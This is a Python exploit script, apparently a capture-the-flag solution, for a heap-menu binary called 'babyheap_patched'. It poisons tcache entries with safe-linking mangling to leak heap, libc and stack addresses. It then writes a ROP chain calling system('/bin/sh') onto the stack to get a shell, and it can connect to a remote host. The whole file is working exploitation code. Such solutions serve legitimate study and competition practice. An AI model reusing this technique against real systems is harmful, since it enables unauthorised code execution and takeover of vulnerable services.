#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./babyheap_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x1359
brva 0x1434
brva 0x14B6
brva 0x151A
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b'> ', choice)

def malloc(idx: int, content: bytes):
    menu(1)
    slna(b'Index? ', idx)
    sa(b'Content? Content? ', content)

def free(idx: int):
    menu(4)
    slna(b'Index? ', idx)

def read(idx: int):
    menu(2)
    slna(b'Index? ', idx)

def update(idx: int, content: bytes):
    menu(3)
    slna(b'Index? ', idx)
    sa(b'Content? ', content)

# ==================== EXPLOIT ====================
p = start()

malloc(0, b'0')
malloc(1, b'1')
malloc(2, b'2')

free(0)
free(2)

read(0)
heap = u64(rb(6).ljust(0x8, b'\0')) << 12
slog('heap base @ %#x', heap)

update(2, p64(mangle(heap, heap+0x290)))
malloc(3, b'3')

malloc(4, p64(0) + p64(0x431))
free(1)
free(2)

update(2, p64(mangle(heap, heap+0x290+0x430)))
malloc(5, b'5')

malloc(6, flat(
    0, 0x21,
    0, 0,
    0, 0x21,
))

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

free(0)
read(0)
libc.address = u64(rb(6).ljust(0x8, b'\0')) - 0x203b20
slog('libc address @ %#x', libc.address)

malloc(7, b'7')
malloc(8, b'7')
malloc(9, b'7')

free(7)
free(9)

update(9, p64(mangle(heap, libc.sym.environ-0x18)))

malloc(11, b'11')
malloc(12, b'A'*0x18)
read(12)
ru(b'A'*0x18)
stack_leak = u64(rb(6).ljust(0x8, b'\0'))
slog('stack leak @ %#x', stack_leak)

malloc(13, b'13')
malloc(14, b'14')

free(13)
free(14)

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

update(14, p64(mangle(heap, stack_leak-0x158)))
malloc(15, b'15')

malloc(16, flat(
    0,
    pop_rdi, next(libc.search(b'/bin/sh\0')),
    ret, libc.sym.system
))


interactive()
